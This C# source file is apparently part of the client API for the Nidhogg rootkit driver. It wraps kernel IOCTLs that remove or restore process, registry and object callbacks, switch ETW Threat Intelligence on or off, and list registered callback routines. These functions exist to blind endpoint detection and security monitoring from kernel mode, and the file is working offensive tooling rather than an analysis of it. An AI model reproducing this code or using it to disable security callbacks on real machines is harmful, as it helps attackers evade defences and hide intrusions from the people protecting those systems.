using System;
using static NidhoggCSharpApi.NidhoggApi;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;

namespace NidhoggCSharpApi
{
    internal partial class NidhoggApi
    {
        private NidhoggErrorCodes EnableDisableCallback(ulong callbackAddress, CallbackType callbackType, bool remove)
        {
            KernelCallback callback = new KernelCallback
            {
                CallbackAddress = callbackAddress,
                Type = callbackType,
                Remove = remove
            };

            return NidhoggSendDataIoctl(callback, IOCTL_REMOVE_RESTORE_CALLBACK);
        }

        public NidhoggErrorCodes EnableCallback(ulong callbackAddress, CallbackType callbackType)
        {
            return EnableDisableCallback(callbackAddress, callbackType, false);
        }

        public NidhoggErrorCodes DisableCallback(ulong callbackAddress, CallbackType callbackType)
        {
            return EnableDisableCallback(callbackAddress, callbackType, true);
        }

        public NidhoggErrorCodes EnableDisableEtwTi(bool enable)
        {
            return NidhoggSendDataIoctl(enable, IOCTL_ENABLE_DISABLE_ETWTI);
        }

        public PsRoutinesList ListPsRoutines(CallbackType callbackType)
        {
            int structSize = Marshal.SizeOf<PsRoutine>();

            RawPsRoutinesList rawRoutines = new RawPsRoutinesList
            {
                Type = callbackType,
            };
            rawRoutines.Routines = Marshal.AllocHGlobal((int)MAX_ROUTINES * structSize);

            rawRoutines = NidhoggSendRecieveDataIoctl(rawRoutines, IOCTL_LIST_PSROUTINES);

            if (rawRoutines.NumberOfRoutines == 0)
                return new PsRoutinesList();

            PsRoutinesList routines = new PsRoutinesList
            {
                Type = callbackType,
                NumberOfRoutines = rawRoutines.NumberOfRoutines,
                Routines = new PsRoutine[MAX_ROUTINES]
            };

            for (int i = 0; i < rawRoutines.NumberOfRoutines; i++)
            {
                IntPtr currentPtr = IntPtr.Add(rawRoutines.Routines, i * structSize);
                routines.Routines[i] = Marshal.PtrToStructure<PsRoutine>(currentPtr);
            }

            Marshal.FreeHGlobal(rawRoutines.Routines);
            return routines;
        }

        public CmCallbacksList ListRegistryCallbacks()
        {
            int structSize = Marshal.SizeOf<CmCallback>();

            RawCmCallbacksList rawCallbacks = new RawCmCallbacksList
            {
                Callbacks = Marshal.AllocHGlobal((int)MAX_ROUTINES * structSize)
            };

            rawCallbacks = NidhoggSendRecieveDataIoctl(rawCallbacks, IOCTL_LIST_REGCALLBACKS);

            if (rawCallbacks.NumberOfCallbacks == 0)
                return new CmCallbacksList();

            CmCallbacksList callbacks = new CmCallbacksList
            {
                NumberOfCallbacks = rawCallbacks.NumberOfCallbacks,
                Callbacks = new CmCallback[MAX_ROUTINES]
            };

            for (int i = 0; i < rawCallbacks.NumberOfCallbacks; i++)
            {
                IntPtr currentPtr = IntPtr.Add(rawCallbacks.Callbacks, i * structSize);
                callbacks.Callbacks[i] = Marshal.PtrToStructure<CmCallback>(currentPtr);
            }

            Marshal.FreeHGlobal(rawCallbacks.Callbacks);
            return callbacks;
        }

        public ObCallbacksList ListObCallbacks(CallbackType callbackType)
        {
            int structSize = Marshal.SizeOf<ObCallback>();
            RawObCallbacksList rawCallbacks = new RawObCallbacksList
            {
                NumberOfCallbacks = 0,
                Type = callbackType
            };

            rawCallbacks = NidhoggSendRecieveDataIoctl(rawCallbacks, IOCTL_LIST_OBCALLBACKS);

            if (rawCallbacks.NumberOfCallbacks == 0)
                return new ObCallbacksList();
            rawCallbacks.Callbacks = Marshal.AllocHGlobal((int)rawCallbacks.NumberOfCallbacks * structSize);

            ObCallbacksList callbacks = new ObCallbacksList
            {
                NumberOfCallbacks = rawCallbacks.NumberOfCallbacks,
                Type = callbackType,
                Callbacks = new ObCallback[rawCallbacks.NumberOfCallbacks]
            };
            rawCallbacks = NidhoggSendRecieveDataIoctl(rawCallbacks, IOCTL_LIST_OBCALLBACKS);

            for (int i = 0; i < rawCallbacks.NumberOfCallbacks; i++)
            {
                IntPtr currentPtr = IntPtr.Add(rawCallbacks.Callbacks, i * structSize);
                callbacks.Callbacks[i] = Marshal.PtrToStructure<ObCallback>(currentPtr);
            }

            Marshal.FreeHGlobal(rawCallbacks.Callbacks);
            return callbacks;
        }
    }
}